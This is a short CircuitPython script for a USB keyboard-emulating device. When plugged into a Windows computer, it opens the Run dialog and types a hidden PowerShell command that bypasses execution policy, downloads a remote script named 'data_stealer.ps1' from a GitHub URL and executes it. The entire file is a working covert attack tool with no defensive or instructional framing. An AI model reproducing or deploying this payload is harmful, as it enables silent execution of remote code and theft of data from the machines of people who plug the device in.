import time
import usb_hid
import board
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keycode import Keycode

# Initialize
keyboard = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(keyboard)

# 1.beta
time.sleep(20) 

# 2. run
keyboard.press(Keycode.GUI, Keycode.R)
time.sleep(0.2)
keyboard.release_all()
time.sleep(1.0)

# 3.payload
url = "https://raw.githubusercontent.com/69420-ctrl/tuff-project/main/data_stealer.ps1"
# Added -WindowStyle Hidden and removed the -NoExit flag
payload = f"powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -c IEX(New-Object Net.WebClient).DownloadString('{url}')"

# 4. execute
layout.write(payload)
time.sleep(0.5)
keyboard.send(Keycode.ENTER)

#congrats 
